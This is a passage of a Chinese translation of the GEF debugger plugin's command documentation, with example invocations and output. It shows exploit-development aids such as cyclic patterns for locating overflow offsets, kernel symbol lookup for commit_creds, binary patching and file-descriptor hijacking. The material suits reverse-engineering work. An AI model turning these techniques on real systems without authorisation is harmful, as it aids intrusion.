class="line">模仿WinDBG命令。</span><br><span class="line"></span><br><span class="line">此命令至少需要2个参数，表示数据的格式，以及用作打印hexdump的位置的值/地址/符号。可选的第3个参数用于指定要显示的qword / dword / word / bytes的数量。</span><br><span class="line"></span><br><span class="line">该命令默认提供与WinDBG兼容的别名：</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span><span class="code">`hexdump qword`</span> -&gt; <span class="code">`dq`</span></span><br><span class="line"><span class="bullet">- </span><span class="code">`hexdump dword`</span> -&gt; <span class="code">`dd`</span></span><br><span class="line"><span class="bullet">- </span><span class="code">`hexdump word`</span> -&gt; <span class="code">`dw`</span></span><br><span class="line"><span class="bullet">- </span><span class="code">`hexdump byte`</span> -&gt; <span class="code">`db`</span></span><br><span class="line"></span><br><span class="line">如果字节是可打印的，<span class="code">`hexdump byte`</span>也会尝试显示ASCII字符值（类似于Linux 上的<span class="code">`hexdump -C`</span>命令）。</span><br><span class="line"></span><br><span class="line">语法如下:</span><br></pre></td></tr></table></figure>hexdump (qword|dword|word|byte) LOCATION L[SIZE] [UP|DOWN]<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例子:</span><br><span class="line"></span><br><span class="line"><span class="bullet">- </span>显示 4 QWORD 的 <span class="code">`$pc`</span>:</span><br></pre></td></tr></table></figure>gef➤  dq $pc l40x7ffff7a5c1c0+0000 │ 0x48555441554156410x7ffff7a5c1c0+0008 │ 0x0090ec814853cd890x7ffff7a5c1c0+0010 │ 0x377d6f058b4800000x7ffff7a5c1c0+0018 │ 0x748918247c894800<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 显示 <span class="number">32</span> bytes 的堆栈中的某个位置:</span><br></pre></td></tr></table></figure>gef➤  db 0x00007fffffffe5e5 l320x00007fffffffe5e5     2f 68 6f 6d 65 2f 68 75 67 73 79 2f 63 6f 64 65     /home/hugsy/code0x00007fffffffe5f5     2f 67 65 66 2f 74 65 73 74 73 2f 77 69 6e 00 41     /gef/tests/win.A<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## hijack-fd 命令</span><br><span class="line"></span><br><span class="line">`gef`可用于修改已调试进程的文件描述符。新文件描述符可以指向文件，管道，套接字，设备等。</span><br><span class="line"></span><br><span class="line">要使用它，只需运行</span><br></pre></td></tr></table></figure>gef➤ hijack-fd FDNUM NEWFILE<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如,</span><br></pre></td></tr></table></figure>gef➤ hijack-fd 1 /dev/null<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将修改当前进程文件描述符以将STDOUT重定向到 <span class="code">`/dev/null`</span>。</span><br><span class="line"></span><br><span class="line">检查此asciicast以获取可视化示例：![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/Hx5iNNLxDaAG.png</span>)</span><br><span class="line"></span><br><span class="line">此命令还支持连接到ip:port（如果它作为参数提供）。例如</span><br></pre></td></tr></table></figure>gef➤ hijack-fd 0 localhost:8888<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将STDIN重定向到localhost:8888</span><br><span class="line"></span><br><span class="line">还有一个例子： ![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/U5sDMXuISz4k.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## ida-interact 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`gef`</span>提供了一个简单的XML-RPC客户端，用于与在特定IDA Python插件中运行的服务器通信<span class="code">`ida_gef.py`</span>（可在[<span class="string">这里</span>](<span class="link">https://raw.githubusercontent.com/hugsy/gef/master/scripts/ida_gef.py</span>)免费下载 ）</span><br><span class="line"></span><br><span class="line">只需下载此脚本，然后在IDA中运行即可。当服务器运行时，您将在“输出”窗口中看到一个文本，例如：</span><br></pre></td></tr></table></figure>[+] Creating new thread for XMLRPC server: Thread-1[+] Starting XMLRPC server: 0.0.0.0:1337[+] Registered 6 functions.<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这表明XML-RPC服务器已准备就绪并正在侦听。</span><br><span class="line"></span><br><span class="line">`gef`可以通过`ida-interact`命令与它进行交互。此命令接收要执行的函数的名称作为第一个参数，所有其他参数是远程函数的参数。</span><br><span class="line"></span><br><span class="line">要枚举可用的功能，只需运行</span><br></pre></td></tr></table></figure>gef➤  ida-interact -h<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/nTOhFfUnaaoN.png</span>)</span><br><span class="line"></span><br><span class="line">现在，要执行RPC，请使用命令<span class="code">`ida-interact`</span>并附加其参数（如果需要）。</span><br><span class="line"></span><br><span class="line">例如：</span><br></pre></td></tr></table></figure>gef➤  ida ida.set_color 0x40061E<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">将编辑远程IDB并设置<span class="number">0x40061E</span>处的背景颜色为<span class="number">0x005500</span>（默认值）。</span><br><span class="line"></span><br><span class="line">另一个方便的例子是直接从`gef`向IDA中添加注释：</span><br></pre></td></tr></table></figure>gef➤  ida ida.add_comment 0x40060C &quot;&lt;&lt;&lt;--- stack overflow&quot;[+] Success<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">结果:</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/Ws2NBBhyGlAR.png</span>)</span><br><span class="line"></span><br><span class="line">请使用–help参数查看所有可用的方法及其语法。</span><br><span class="line"></span><br><span class="line">值得注意的是， [<span class="string">Binary Ninja</span>](<span class="link">https://binary.ninja/</span>) 支持已被添加：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/aCTqjeTuH1To.png</span>)</span><br><span class="line"></span><br><span class="line">通过使用脚本 [<span class="string">`binja_gef.py`</span>](<span class="link">https://raw.githubusercontent.com/hugsy/gef/master/scripts/binja_gef.py</span>).</span><br><span class="line"></span><br><span class="line"><span class="section">## ksymaddr 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`ksymaddr`</span>有助于按名称查找内核符号。</span><br><span class="line"></span><br><span class="line">语法很简单：</span><br></pre></td></tr></table></figure>ksymaddr &lt;PATTERN&gt;<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如,</span><br></pre></td></tr></table></figure>gef➤  ksymaddr commit_creds[+] Found matching symbol for &apos;commit_creds&apos; at 0xffffffff8f495740 (type=T)[*] Found partial match for &apos;commit_creds&apos; at 0xffffffff8f495740 (type=T): commit_creds[*] Found partial match for &apos;commit_creds&apos; at 0xffffffff8fc71ee0 (type=R): __ksymtab_commit_creds[*] Found partial match for &apos;commit_creds&apos; at 0xffffffff8fc8d008 (type=r): __kcrctab_commit_creds[*] Found partial match for &apos;commit_creds&apos; at 0xffffffff8fc9bfcd (type=r): __kstrtab_commit_creds<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## memory 命令</span></span><br><span class="line"></span><br><span class="line">只要在上下文布局中启用了“内存”部分（默认情况下），就可以注册地址，长度和分组大小。</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/Jmb9CMo8NbEx.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">### 添加一个查看</span></span><br></pre></td></tr></table></figure>memory watch &lt;ADDRESS&gt; [SIZE] [(qword|dword|word|byte)]<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 移除一个查看</span><br></pre></td></tr></table></figure>memory unwatch &lt;ADDRESS&gt;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 列出所有查看</span><br></pre></td></tr></table></figure>memory list<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 清楚所有查看</span><br></pre></td></tr></table></figure>memory clear<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## nop 命令</span><br><span class="line"></span><br><span class="line">`nop`命令允许您轻松跳过指令。</span><br></pre></td></tr></table></figure>gef➤ nop [-b NUM_BYTES] [-h] [LOCATION]<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`LOCATION`表示要绕过的指令的地址。 如果未指定，它将使用程序计数器的当前值。</span><br><span class="line"></span><br><span class="line">如果输入`-b `，gef将显式修补指定的字节数。 否则它会在目标位置修补_whole_指令。</span><br><span class="line"></span><br><span class="line">## patch 命令</span><br><span class="line"></span><br><span class="line">将指定的值修补到指定的地址。</span><br><span class="line"></span><br><span class="line">此命令自动别名为标准的WinDBG命令：`eb`，`ew`，`ed`，`eq`和`ea`。</span><br></pre></td></tr></table></figure>gef➤ patch byte $eip 0x90gef➤ eb 0x8048000 0x41gef➤ ea 0xbffffd74 &quot;This is a double-escaped string\\x00&quot;<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## pattern 命令</span></span><br><span class="line"></span><br><span class="line">此命令将创建或搜索一个 [<span class="string">De Bruijn</span>](<span class="link">https://en.wikipedia.org/wiki/De_Bruijn_sequence</span>) 循环模式，以便于确定内存中的偏移量。</span><br><span class="line"></span><br><span class="line">应该注意的是，为了更好的兼容性，<span class="code">`GEF`</span>中实现的算法与<span class="code">`pwntools`</span>中的算法相同，因此可以结合使用。</span><br><span class="line"></span><br><span class="line"><span class="section">### 创建</span></span><br><span class="line"></span><br><span class="line">子命令<span class="code">`create`</span>允许创建一个新pattern：</span><br></pre></td></tr></table></figure>gef➤  pattern create 128[+] Generating a pattern of 128 bytesaaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab[+] Saved as &apos;$_gef0&apos;<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">该模式可以在以后用作输入。 为了生成这个输入，`GET`考虑了体系结构的大小（<span class="number">16</span>,<span class="number">32</span>或<span class="number">64</span>位），以生成它。</span><br><span class="line"></span><br><span class="line">与`pwntools`的等效命令是</span><br></pre></td></tr></table></figure>from pwn import *p = cyclic(128, n=8)<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">其中`n`是体系结构的字节数（<span class="number">8</span>位为<span class="number">64</span>位，<span class="number">4</span>位为<span class="number">32</span>位）。</span><br><span class="line"></span><br><span class="line">### 查找</span><br><span class="line"></span><br><span class="line">`search`子命令寻找作为参数给出的值，试图在De Bruijn序列中找到它</span><br></pre></td></tr></table></figure>gef➤  pattern search 0x6161616161616167[+] Searching &apos;0x6161616161616167&apos;[+] Found at offset 48 (little-endian search) likely[+] Found at offset 41 (big-endian search)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">请注意，寄存器也可以作为值传递：</span><br></pre></td></tr></table></figure>gef➤  pattern search $rbp[+] Searching &apos;$rbp&apos;[+] Found at offset 32 (little-endian search) likely[+] Found at offset 25 (big-endian search)<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="section">## pcustom 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`gef`</span> 提供了一种创建任何新结构体(以C结构体方式)和应用于当前调试环境的方法。 除了简单地显示已知和用户定义的结构体之外，它还允许将这些结构体应用于当前上下文。 它打算模仿非常有用的 [<span class="string">WinDBG 中的`dt`命令。</span>](<span class="link">https://msdn.microsoft.com/en-us/library/windows/hardware/ff542772(v=vs.85</span>).aspx)</span><br><span class="line"></span><br><span class="line">这是通过命令<span class="code">`pcustom`</span>（用于<span class="code">`print custom`</span>）实现的，或者你可以使用它的别名<span class="code">`dt`</span>（参考WinDBG命令）。</span><br><span class="line"></span><br><span class="line"><span class="section">### 相关配置</span></span><br><span class="line"></span><br><span class="line">新结构体可以存储在配置给出的位置：</span><br></pre></td></tr></table></figure>gef➤ gef config pcustom.struct_path<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">默认情况下，此位置位于 `$TEMP/gef/structs` (例如 `/tmp/user/<span class="number">1000</span>/gef/structs`).</span><br><span class="line"></span><br><span class="line">可以在一个名为` .py`的文件中创建为一个简单的`ctypes`结构体。</span><br><span class="line"></span><br><span class="line">您可以将此路径设置为新位置</span><br></pre></td></tr></table></figure>gef➤ gef config pcustom.struct_path /my/new/location<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">并保存此更改，以便下次使用`gdb`时可以直接使用它</span><br></pre></td></tr></table></figure>gef➤ gef save[+] Configuration saved to &apos;~/.gef.rc&apos;<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 使用用户定义的结构体</span><br><span class="line"></span><br><span class="line">使用如下命令您可以通过列出现有的自定义结构体</span><br></pre></td></tr></table></figure>gef➤  dt -l[+] Listing custom structures:→  struct5→  struct6<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">要创建或编辑结构体，请使用`dt  -e`以使用目标结构体生成EDITOR。 如果文件不存在，`gef`将创建树和文件，并用`ctypes`模式填充它，你可以立即使用！</span><br></pre></td></tr></table></figure>gef➤  dt mystruct_t -e[+] Creating &apos;/tmp/gef/structs/mystruct_t.py&apos; from template<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">代码可以像任何Python（使用`ctypes`）代码一样定义。</span><br></pre></td></tr></table></figure>from ctypes import *</code></pre></li></ul><p>‘’’<br>typedef struct {<br>  int age;<br>  char name[256];<br>  int id;<br>} person_t;<br>‘’’</p><p>class person_t(Structure):<br>    <em>fields</em> = [<br>        (“age”,  c_int),<br>        (“name”, c_char * 256),<br>        (“id”, c_int),<br>    ]</p><pre><code>_values_ = [    # You can define a function to substitute the value    (&quot;age&quot;, lambda age: &quot;Old&quot; if age &gt; 40 else &quot;Young&quot;),    # Or alternatively a list of 2-tuples    (&quot;id&quot;, [        (0, &quot;root&quot;),        (1, &quot;normal user&quot;),        (None, &quot;Invalid person&quot;)    ])]</code></pre><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`pcustom`至少需要一个参数，即结构体的名称。 只有一个参数时，`pcustom`将转储此结构体的所有字段。</span><br></pre></td></tr></table></figure><p>gef➤  dt person_t<br>+0000 age c_int (x4)  →  Young<br>+0004 name c_char_Array_256 (x100)<br>+0104 id c_int (x1)   →  normal user</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">通过提供地址或GDB符号，<span class="code">`gef`</span>将把这个用户定义的结构体应用于指定的地址：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/uJEK5zGvDOCf.png</span>)</span><br><span class="line"></span><br><span class="line">这意味着我们现在可以非常轻松地创建新的用户定义结构体</span><br><span class="line"></span><br><span class="line">观看Asciinema的演示视频：</span><br><span class="line"></span><br><span class="line">[<span class="string">![asciicast</span>](<span class="link">../../../../../../program/writing/images/gef/bhsguibtf4iqyyuomp3vy8iv2.png</span>)](<span class="link">https://asciinema.org/a/bhsguibtf4iqyyuomp3vy8iv2</span>)</span><br><span class="line"></span><br><span class="line">此外，如果您已成功配置IDA设置（请参阅命令<span class="code">`ida-interact`</span>），您还可以直接在GDB会话中直接导入在IDA中进行逆向工程的结构体：</span><br><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/ijlTYArWpr68.png</span>)</span><br><span class="line"></span><br><span class="line">然后使用命令<span class="code">`ida ImportStructs`</span>导入所有结构体，或者<span class="code">`ida ImportStruct `</span>只导入一个特定的结构体：</span><br></pre></td></tr></table></figure><p>gef➤  ida ImportStructs<br>[+] Success</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">![<span class="string">mark</span>](<span class="link">../../../../../../program/writing/images/gef/tayxIKotL8eF.png</span>)</span><br><span class="line"></span><br><span class="line"><span class="section">## pie 命令</span></span><br><span class="line"></span><br><span class="line"><span class="code">`pie`</span>命令提供了一种为启用PIE的二进制文件设置断点的有用方法。 <span class="code">`pie`</span>命令提供我们称之为“PIE断点”的东西。 PIE断点只是一个虚拟断点，当进程附加时，它将被设置为实际断点。 PIE断点的地址是二进制基址的偏移量。</span><br><span class="line"></span><br><span class="line">请注意，您需要使用整个PIE命令序列来支持PIE断点，尤其是<span class="code">`pie`</span>命令提供的“附加”命令，如<span class="code">`pie attach`</span>，<span class="code">`pie run`</span>等。</span><br><span class="line"></span><br><span class="line">用法：</span><br></pre></td></tr></table></figure><p>gef➤ pie <sub_commands></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `pie breakpoint` 命令</span><br><span class="line"></span><br><span class="line">此命令设置新的PIE断点。 它可以像gdb中的普通`breakpoint`命令一样使用。 该位置只是与基址的偏移量。 此命令后不会立即设置断点。 相反，它将在您使用`pie attach`，`pie run`，`pie remote`实际附加到进程时设置，因此它可以解析正确的基址。</span><br><span class="line"></span><br><span class="line">用法：</span><br></pre></td></tr></table></figure><p>gef➤ pie breakpoint <LOCATION></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `pie info` 命令</span><br><span class="line"></span><br><span class="line">由于PIE断点不是真正的断点，因此该命令提供了一种观察所有PIE断点状态的方法。</span><br><span class="line"></span><br><span class="line">这就像gdb中的`info breakpoint`。</span><br></pre></td></tr></table></figure><p>gef➤  pie info<br>VNum    Num Addr<br>1   N/A 0xdeadbeef</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">VNum是虚拟号码，它是PIE断点的编号。 Num是gdb中相应实际断点数的编号。 地址是PIE断点的地址。</span><br><span class="line"></span><br><span class="line">您可以忽略VNum参数以获取所有PIE断点的信息。</span><br><span class="line"></span><br><span class="line">用法：</span><br></pre></td></tr></table></figure><p>gef➤  pie info [VNum]</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `pie delete` 命令</span><br><span class="line"></span><br><span class="line">给定该PIE断点的VNum时，此命令将删除PIE断点。</span><br><span class="line"></span><br><span class="line">用法：</span><br></pre></td></tr></table></figure><p>gef➤  pie delete <VNum></p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### `pie attach` 命令</span><br><span class="line"></span><br><span class="line">与gdb的`attach`命令相同。 如果您有PIE断点，请始终使用此命令而不是原始`attach`。 这将在附加时设置真正的断点。</span><br><span class="line"></span><br><span class="line">用法与`attach`相同。</span><br><span class="line"></span><br><span class="line">### `pie remote` 命令</span><br><span class="line"></span><br><span class="line">与gdb的`remote`命令相同。 如果您有PIE断点，请始终使用此命令而不是原始`remote`。 这将在附加时设置真正的断点。</span><br><span class="line"></span><br><span class="line">用法与`remote`相同。</span><br><span class="line"></span><br><span class="line">### `pie run` 命令</span><br><span class="line"></span><br><span class="line">与gdb的`run`命令相同。 如果您有PIE断点，请始终使用命令而不是原始`run`。 这将在附加时设置真正的断点。</span><br><span class="line"></span><br><span class="line">用法与`run`相同。</span><br><span class="line"></span><br><span class="line">## print-format 命令</span><br><span class="line"></span><br><span class="line">- 命令</span><br></pre></td></tr></table></figure><pre><code>print-format<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（别名</span><br></pre></td></tr></table></figure>pf<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">）将根据指定的编程语言的语法将任意位置转储为字节数组。 目前，支持的输出语言是</span><br><span class="line"></span><br><span class="line">- Python (`py` – 默认)</span><br><span class="line">- C (`c`)</span><br><span class="line">- Assembly (`asm`)</span><br><span class="line">- Javascript (`js`)</span><br></pre></td></tr></table></figure></code></pre><p>gef➤  print-format -h<br>[+] print-format [-f FORMAT] [-b BITSIZE] [-l LENGTH] [-c] [-h] LOCATION<br>        -f FORMAT specifies the output format for programming language, avaliable value is py, c, js, asm (default py).<br>        -b BITSIZE sepecifies size of bit, avaliable values is 8, 16, 32, 64 (default is 8).<br>        -l LENGTH specifies length of array (default is 256).<br>        -c The result of data will copied to clipboard (requires xclip)<br>        LOCATION specifies where the address of bytes is stored.</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">例如，此命令将从`$rsp`转储<span class="number">10</span>个字节，并将结果复制到剪贴板。</span><br></pre></td></tr></table></figure><p>gef➤  print-format -f py -b 8 -l 10 -c $rsp<br>[+] Copied to clipboard<br>buf = [0x87, 0xfa, 0xa3, 0xf7, 0xff, 0x7f, 0x0, 0x0, 0x30, 0xe6]</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## process-search 命令</span><br><span class="line"></span><br><span class="line">`process-search`（又名`ps`）是一个方便的命令，用于在主机上列出和过滤进程。 它的目的是在针对分叉过程（例如在新连接上分叉的tcp/listen守护进程）时使调试过程更容易一些。</span><br><span class="line"></span><br><span class="line">如果没有参数，它将返回用户可以访问的所有进程：</span><br></pre></td></tr></table></figure><p>gef➤  ps<br>1               root            0.0             0.4             ?           /sbin/init<br>2               root            0.0             0.0             ?           [kthreadd]<br>3               root            0.0             0.0             ?           [ksoftirqd/0]<br>4               root            0.0             0.0             ?           [kworker/0:0]<br>5               root            0.0             0.0             ?           [kworker/0:0H]<br>6               root            0.0             0.0             ?           [kworker/u2:0]<br>7               root            0.0             0.0             ?           [rcu_sched]<br>8               root            0.0             0.0             ?           [rcuos/0]<br>9               root            0.0             0.0             ?           [rcu_bh]<br>10              root            0.0             0.0             ?           [rcuob/0]<br>11              root            0.0             0.0             ?           [migration/0]<br>[…]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">或者启用过滤器：</span><br></pre></td></tr></table></figure><p>gef➤  ps bash<br>22590           vagrant         0.0             0.8             pts/0       -bash</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">`ps`也允许使用以下选项：</span><br><span class="line"></span><br><span class="line">- `-s`（`smart`）将丢弃一些进程（属于不同的用户，用作参数的模式而不是命令等）</span><br><span class="line">- `-a`（`attach`）将自动附加到找到的第一个进程</span><br><span class="line"></span><br><span class="line">因此，例如，如果您的目标进程名为`/home/foobar/plop`，但现有实例通过`socat`使用，如</span><br></pre></td></tr></table></figure><p>$ socat tcp-l:1234,fork,reuseaddr exec:/home/foobar/plop</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">每次向tcp/<span class="number">1234</span>打开一个新连接时，`plop`将被分叉，并且`gef`可以通过命令轻松附加到它</span><br></pre></td></tr></table></figure><p>gef➤  ps -as plop</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 